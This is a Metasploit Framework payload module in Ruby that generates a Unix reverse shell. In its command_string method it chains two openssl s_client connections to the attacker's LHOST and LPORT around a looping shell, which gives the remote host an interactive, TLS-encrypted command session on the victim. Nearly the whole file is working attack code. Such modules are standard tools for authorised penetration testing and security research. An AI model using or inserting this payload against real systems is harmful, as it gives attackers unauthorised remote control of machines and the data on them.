##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 182

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Double Reverse TCP SSL (openssl)',
     'Description'   => 'Creates an interactive shell through two inbound connections',
     'Author'        => 'hdm',
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcpDoubleSSL,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'openssl',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('OpenSSLPath', [true, 'The path to the OpenSSL executable', 'openssl']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd =
      "#{datastore['ShellPath']} -c '(sleep #{3600+rand(1024)}|" +
      "#{datastore['OpenSSLPath']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
      "while : ; do #{datastore['ShellPath']} && break; done 2>&1|" +
      "#{datastore['OpenSSLPath']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}" +
      " >/dev/null 2>&1 &)'"
    return cmd
  end
end
